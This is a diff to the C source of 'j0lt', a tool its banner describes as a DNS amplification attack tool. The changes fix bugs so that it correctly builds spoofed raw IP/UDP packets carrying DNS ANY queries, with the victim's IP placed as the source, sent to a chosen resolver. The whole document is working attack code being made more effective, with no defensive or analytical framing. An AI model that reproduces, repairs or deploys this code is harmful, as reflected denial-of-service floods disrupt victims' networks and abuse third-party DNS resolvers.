@@ -126,7 +126,6 @@ const char* g_ansi = {
     " w3lc0m3 t0 j0lt                         \n"
     " a DNS amplification attack tool         \n"
     "                                         \n"
-    "                                     2021\n"
     "            the-scientist@rootstorm.com\n\n"
 };
 
@@ -166,6 +165,12 @@ main(int argc, char** argv)
         goto fail_state;
     }
 
+    raw_sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    if (raw_sockfd == -1) {
+        fprintf(stderr, "connect_client error\n");
+        goto fail_state;
+    }
+
     resolvip = argv[ 1 ];
     resolvprt = argv[ 2 ];
     victimip = argv[ 3 ];
@@ -174,20 +179,14 @@ main(int argc, char** argv)
     buflen = NS_PACKETSZ;
     memset(pktbuf, NS_PACKETSZ, 0);
 
-    pack_dnshdr(&dnsheader, ns_o_query, ns_r_noerror);
     curpos = pktbuf;
     status = true;
-    status &= insert_dns_header(curpos, &buflen, &dnsheader);
-    status &= insert_dns_question(( void** ) curpos, &buflen, resolvip, ns_t_any, ns_c_any);
+    pack_dnshdr(&dnsheader, ns_o_query, ns_r_noerror);
+    status &= insert_dns_header(&curpos, &buflen, &dnsheader);
+    status &= insert_dns_question(( void** ) &curpos, &buflen, "google.com", ns_t_any, ns_c_any);
 
     if (status == false) {
         fprintf(stderr, "create_dns_packet error\n");
-        goto fail_state;
-    }
-
-    raw_sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
-    if (raw_sockfd == -1) {
-        fprintf(stderr, "connect_client error\n");
         goto fail_state;
     }
 
@@ -213,6 +212,7 @@ fail_state:
 void
 pack_dnshdr(DNSHEADER* dnshdr, uint8_t opcode, uint8_t rcode)
 {
+    memset(dnshdr, 0, sizeof(DNSHEADER));
     dnshdr->id = ID;
     dnshdr->rd = RD;
     dnshdr->tc = TC;
@@ -244,7 +244,7 @@ pack_udphdr(UDPHEADER* udphdr, PSEUDOHDR* pseudohdr, size_t nwritten, const char
         exit(EXIT_FAILURE);
     }
 
-    memset(&udphdr, 0, sizeof(UDPHEADER));
+    memset(udphdr, 0, sizeof(UDPHEADER));
     udphdr->uh_dport = htons(dport_uint16); // nameserver port
     udphdr->uh_sport = htons(sport_uint16); // victim port
     udphdr->uh_ulen = htons(nwritten + sizeof(UDPHEADER));
@@ -256,7 +256,7 @@ pack_udphdr(UDPHEADER* udphdr, PSEUDOHDR* pseudohdr, size_t nwritten, const char
 void
 pack_iphdr(IPHEADER* iphdr, PSEUDOHDR* pseudohdr, const char* sourceip, const char* destip, size_t nwritten, size_t udpsz)
 {
-    memset(&iphdr, 0, sizeof(IPHEADER));
+    memset(iphdr, 0, sizeof(IPHEADER));
     iphdr->version = IPVER;
     iphdr->ihl = IHL_MIN;
     iphdr->tot_len = htons(sizeof(IPHEADER) + nwritten + udpsz);
